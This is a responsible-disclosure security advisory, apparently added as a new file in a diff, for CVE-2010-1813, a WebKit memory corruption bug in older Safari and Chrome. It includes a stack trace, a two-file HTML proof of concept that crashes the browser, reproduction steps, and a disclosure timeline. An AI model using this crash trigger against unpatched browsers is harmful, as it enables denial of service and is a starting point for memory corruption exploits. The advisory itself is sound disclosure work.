@@ -1,0 +1,111 @@
+TITLE: WEBKIT (APPLE SAFARI < 4.1.2/5.0.2 & GOOGLE CHROME < 5.0.375.125) MEMORY CORRUPTION VULNERABILITY
+TESTED OS: WINDOWS XP SP3
+SEVERITY: HIGH
+CVE-NUMBER: CVE-2010-1813
+DISCOVERED DATE: 2010-06-29
+FIXED DATE: GOOGLE CHROME (2010-07-26) & APPLE SAFARI (2010-09-08)
+FIXED VERSIONS: GOOGLE CHROME 5.0.375.125 & APPLE SAFARI 4.1.2/5.0.2
+DISCOVERED BY: JOSE A. VAZQUEZ
+
+======ABOUT APPLICATION======
+
+"WebKit is an open source web browser engine. WebKit is also the name of the Mac OS X system framework version 
+of the engine that's used by Safari, Dashboard, Mail, and many other OS X applications. WebKit's HTML and 
+JavaScript code began as a branch of the KHTML and KJS libraries from KDE..." copied from http://webkit.org/
+
+======DESCRIPTION======
+
+A memory corruption vulnerability was confirmed by Chromium Security Team. Original stacktrace showed a null ptr 
+dereference, but some pointers were also corrupted. 
+
+Stacktrace (using Chrome symbols):
+
+WebCore::RenderObject::containingBlock()  Line 597
+WebCore::RenderBlock::paintContinuationOutlines()  Line 2344
+WebCore::RenderBlock::paintObject()  Line 2232
+WebCore::RenderBlock::paint()  Line 1980
+WebCore::RenderLayer::paintLayer()  Line 2447
+WebCore::RenderLayer::paintList()  Line 2499
+WebCore::RenderLayer::paintLayer()  Line 2468
+WebCore::RenderLayer::paint()  Line 2252
+WebCore::FrameView::paintContents()  Line 1943
+WebCore::ScrollView::paint()  Line 797
+WebCore::RenderWidget::paint()  Line 281
+WebCore::InlineBox::paint()  Line 180
+WebCore::InlineFlowBox::paint()  Line 682
+WebCore::RootInlineBox::paint()  Line 167
+WebCore::RenderLineBoxList::paint()  Line 219
+WebCore::RenderBlock::paintContents()  Line 2090
+WebCore::RenderBlock::paintObject()  Line 2199
+WebCore::RenderBlock::paint()  Line 1980
+WebCore::RenderBlock::paintChildren()  Line 2127
+WebCore::RenderBlock::paintContents()  Line 2092
+WebCore::RenderBlock::paintObject()  Line 2199
+WebCore::RenderBlock::paint()  Line 1980
+WebCore::RenderLayer::paintLayer()  Line 2445
+WebCore::RenderLayer::paintList()  Line 2499
+WebCore::RenderLayer::paintLayer()  Line 2468
+WebCore::RenderLayer::paint()  Line 2252
+WebCore::FrameView::paintContents()  Line 1943
+WebCore::ScrollView::paint()  Line 797
+WebKit::WebFrameImpl::paintWithContext()  Line 1795
+WebKit::WebFrameImpl::paint()  Line 1818
+WebKit::WebViewImpl::paint()  Line 979
+RenderWidget::PaintRect()  Line 390
+RenderWidget::DoDeferredUpdate()  Line 501
+RenderWidget::CallDoDeferredUpdate()  Line 428
+
+
+======PROOF OF CONCEPT======
+
+File 1.html:
+
+<meta http-equiv="refresh" content="1;URL=1.html" >
+<iframe src="2.html"></iframe>
+
+File 2.html:
+
+<dialog style='position:relative'>
+ <h style='outline-style:auto'>X<div></div></h>
+</dialog>
+
+
+======STEPS TO REPRODUCE======
+
+1.- Upload 1.html and 2.html to your server.
+2.- Open file 1.html with vulnerable app.
+
+-Google Chrome:
+
+3.- Wait for a while, then, crash is got (sad-tab).
+
+-Apple Safari:
+
+3.- Wait for a while, if crash is not got, use Ctrl+T to trigger it.
+ 
+
+
+======REFERENCES======
+
+[ref-1] -> https://bugs.webkit.org/show_bug.cgi?id=41373
+[ref-2] -> http://googlechromereleases.blogspot.com/2010/07/stable-channel-update_26.html
+[ref-3] -> http://support.apple.com/kb/HT4334
+[ref-4] -> http://spa-s3c.blogspot.com/2010/09/full-responsible-disclosurewebkit-apple.html
+
+
+======DISCLOSURE TIMELINE======
+
+Standard Time Zone: GMT/UTC + 01:00 hour (Spain/Madrid)
+
+[2010-06-29] => Posted new issue in Chromium Project (with pocs).
+[2010-06-29] => Chromium confirmed memory corruption and opened new webkit bug.
+[2010-07-26] => Chromium released new fix (Google Chrome 5.0.375.125).
+[2010-09-08] => Apple released new fix (Apple Safari 4.1.2/5.0.2).
+[2010-09-10] => Public disclosure.
+
+
+======CREDITS=======
+
+Jose Antonio Vazquez Gonzalez,
+Telecom. Engineer & Sec. Researcher.
+http://spa-s3c.blogspot.com/
